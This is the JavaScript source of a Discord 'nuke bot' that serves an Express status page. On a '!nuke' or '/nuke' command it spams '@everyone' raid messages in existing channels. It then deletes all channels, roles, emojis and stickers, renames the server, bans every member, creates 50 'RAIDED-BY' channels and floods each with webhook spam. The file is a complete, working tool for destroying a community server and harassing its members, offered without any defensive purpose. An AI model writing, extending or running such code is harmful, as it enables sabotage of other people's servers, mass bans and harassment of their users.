require('dotenv').config();
const express = require('express');
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, REST, Routes } = require('discord.js');

// ---- EXPRESS WEB SERVER ----
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
      <head><title>☢️ NUKE BOT</title></head>
      <body style="background: #0a0a0a; color: #ff4444; font-family: monospace; text-align: center; padding: 50px;">
        <h1>🔥 NUKE BOT IS ALIVE</h1>
        <p>Status: <span style="color: #00ff00;">● ONLINE</span></p>
        <p>Uptime: ${Math.floor(process.uptime())} seconds</p>
        <p>Commands: <code>!nuke</code> or <code>/nuke</code></p>
        <p style="color: #888; margin-top: 50px;">⚡ Powered by CAT</p>
      </body>
    </html>
  `);
});

app.get('/ping', (req, res) => res.send('pong'));
app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));

// ---- DISCORD BOT ----
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID || null;

const CHANNEL_COUNT = 50;
const MESSAGES_PER_CHANNEL = 50;
const SPAM_TEXT = '@everyone 🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥 @everyone';

// ---- REGISTER COMMANDS WITH RETRY ----
async function registerCommands() {
  const rest = new REST({ version: '10' }).setToken(TOKEN);
  const commands = [{
    name: 'nuke',
    description: '💀 Full server nuke + spam (Admin)',
    default_member_permissions: PermissionsBitField.Flags.Administrator.toString()
  }];

  let success = false;
  let attempts = 0;

  while (!success && attempts < 5) {
    attempts++;
    try {
      console.log(`📡 Registering commands (attempt ${attempts}/5)...`);

      if (GUILD_ID) {
        // Guild-specific (instant)
        await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
        console.log(`✅ Guild commands registered in ${GUILD_ID}`);
      } else {
        // Global (may take 5-10 min)
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('✅ Global commands registered (may take 5-10 min to appear)');
      }

      // Also register as fallback in the other scope
      if (GUILD_ID) {
        // Also push to global as backup
        try {
          await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
          console.log('✅ Also registered globally as backup');
        } catch (_) {}
      }

      success = true;
    } catch (err) {
      console.error(`❌ Registration attempt ${attempts} failed:`, err.message);
      if (attempts < 5) {
        console.log(`⏳ Waiting 3 seconds before retry...`);
        await sleep(3000);
      }
    }
  }

  if (!success) {
    console.log('⚠️ Slash command registration failed. Use !nuke (message command) instead.');
  }
}

client.once('ready', async () => {
  console.log(`🔥 ${client.user.tag} online.`);
  await registerCommands();
  console.log(`✅ Bot ready. Use !nuke or /nuke`);
});

// ---- SLASH COMMAND HANDLER ----
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName === 'nuke') {
    await interaction.deferReply({ ephemeral: true });
    await executeNuke(interaction);
  }
});

// ---- MESSAGE COMMAND HANDLER (ALWAYS WORKS) ----
client.on('messageCreate', async msg => {
  if (msg.author.bot || !msg.guild || msg.content !== '!nuke') return;
  if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return msg.reply('❌ Admin required.');
  }
  await executeNuke(msg);
});

// ---- NUKE FUNCTION (SAME FOR BOTH) ----
async function executeNuke(ctx) {
  const guild = ctx.guild;
  const author = ctx.member || ctx.author;
  const reply = ctx.reply || ctx.channel.send.bind(ctx.channel);
  const editReply = ctx.editReply || (() => {});

  if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
    const err = '❌ I need Administrator.';
    if (ctx.editReply) await ctx.editReply(err);
    else await reply(err);
    return;
  }

  const username = (author.user?.username || author.user?.tag || 'raidboss').toLowerCase().replace(/[^a-z0-9-]/g, '-');
  const spamText = SPAM_TEXT.replace(/{username}/g, author.user?.tag || 'RAIDER');

  if (ctx.editReply) {
    await ctx.editReply(`☢️ **FULL NUKE INITIATED** – deleting, banning, spamming...`);
  } else {
    await reply(`☢️ **FULL NUKE INITIATED** – deleting, banning, spamming...`);
  }

  // ---- SPAM EXISTING CHANNELS ----
  console.log('📨 Spamming existing channels...');
  const existingChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
  for (const [, channel] of existingChannels) {
    try {
      for (let i = 0; i < 10; i++) {
        await channel.send(`${spamText} [PRE-WIPE ${i+1}/10]`);
        await sleep(50);
      }
    } catch (_) {}
  }

  // ---- DELETE EVERYTHING ----
  console.log('🗑️ Deleting channels...');
  for (const [, ch] of guild.channels.cache) {
    try { await ch.delete(); await sleep(80); } catch (_) {}
  }

  console.log('🗑️ Deleting roles...');
  for (const [, role] of guild.roles.cache.filter(r => r.id !== guild.id)) {
    try { await role.delete(); await sleep(80); } catch (_) {}
  }

  console.log('🗑️ Deleting emojis...');
  for (const [, emoji] of guild.emojis.cache) {
    try { await emoji.delete(); await sleep(80); } catch (_) {}
  }

  console.log('🗑️ Deleting stickers...');
  for (const [, sticker] of guild.stickers.cache) {
    try { await sticker.delete(); await sleep(80); } catch (_) {}
  }

  // ---- RENAME + ICON ----
  try {
    await guild.setName(`RAIDED BY ${author.user?.username || 'RAIDER'}`);
    console.log('✅ Server renamed.');
  } catch (_) {}
  try {
    await guild.setIcon('https://i.imgur.com/4MQI7gI.png');
    console.log('✅ Server icon changed.');
  } catch (_) {}

  // ---- BAN ALL ----
  console.log('🔨 Banning members...');
  let banned = 0;
  for (const [, member] of guild.members.cache) {
    if (member.id === author.id || member.id === client.user.id) continue;
    try {
      await member.ban({ reason: 'Nuked by ' + (author.user?.tag || author.tag) });
      banned++;
      if (banned % 10 === 0) await sleep(150);
    } catch (_) {}
  }

  // ---- CREATE 50 CHANNELS ----
  console.log(`📢 Creating ${CHANNEL_COUNT} channels...`);
  const channels = [];
  for (let i = 0; i < CHANNEL_COUNT; i++) {
    try {
      const ch = await guild.channels.create({
        name: i === 0 ? `RAIDED-BY-${username}` : `RAIDED-BY-${username}-${i}`,
        type: ChannelType.GuildText,
        permissionOverwrites: [{
          id: guild.id,
          allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory]
        }]
      });
      channels.push(ch);
      console.log(`✅ Created channel ${i+1}/${CHANNEL_COUNT}`);
      if (i % 10 === 0) await sleep(200);
    } catch (err) {
      console.error(`❌ Failed channel ${i}:`, err.message);
    }
  }

  // ---- SPAM 50 MSGS PER CHANNEL ----
  console.log(`📨 Spamming ${MESSAGES_PER_CHANNEL} msgs in ${channels.length} channels...`);
  let totalSent = 0;
  for (let chIdx = 0; chIdx < channels.length; chIdx++) {
    const channel = channels[chIdx];
    console.log(`📨 Channel ${chIdx+1}/${channels.length}: ${channel.name}`);

    let webhook;
    try {
      webhook = await channel.createWebhook({
        name: 'RAID-BOT',
        avatar: 'https://i.imgur.com/4MQI7gI.png'
      });
    } catch (err) {
      console.error(`❌ Webhook failed:`, err.message);
      continue;
    }

    let sent = 0;
    let failures = 0;

    for (let msgIdx = 0; msgIdx < MESSAGES_PER_CHANNEL; msgIdx++) {
      try {
        await webhook.send({
          content: `${spamText} [${msgIdx+1}/${MESSAGES_PER_CHANNEL}]`,
          username: author.user?.username || 'RAIDER',
          avatarURL: 'https://i.imgur.com/4MQI7gI.png'
        });
        sent++;
        totalSent++;
        failures = 0;

        if (sent % 10 === 0) {
          console.log(`   📤 ${channel.name} – ${sent}/${MESSAGES_PER_CHANNEL}`);
        }

        await sleep(80);

      } catch (err) {
        failures++;
        if (failures > 5) {
          console.log(`❌ Failed on ${channel.name}, moving on.`);
          break;
        }
        await sleep(1000);
        msgIdx--;
      }
    }

    try { await webhook.delete(); } catch (_) {}
    console.log(`✅ ${channel.name} – sent ${sent} messages`);
    await sleep(150);
  }

  // ---- FINAL VICTORY ----
  const summary = `💀 **SERVER DESTROYED**\nChannels: ${channels.length}\nMessages: ${totalSent}\nBanned: ${banned}\nExecutor: ${author.user?.tag || author.tag}\n**THIS SERVER BELONGS TO ${author.user?.username?.toUpperCase() || 'RAIDER'}**`;
  try {
    if (channels.length > 0) {
      await channels[0].send(summary);
    }
  } catch (_) {}

  console.log(`🎯 NUKE COMPLETE: ${channels.length} channels, ${totalSent} msgs, ${banned} bans`);
  if (ctx.editReply) {
    await ctx.editReply(`✅ Nuke complete. ${channels.length} channels, ${totalSent} msgs, ${banned} bans.`);
  }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

client.login(TOKEN);
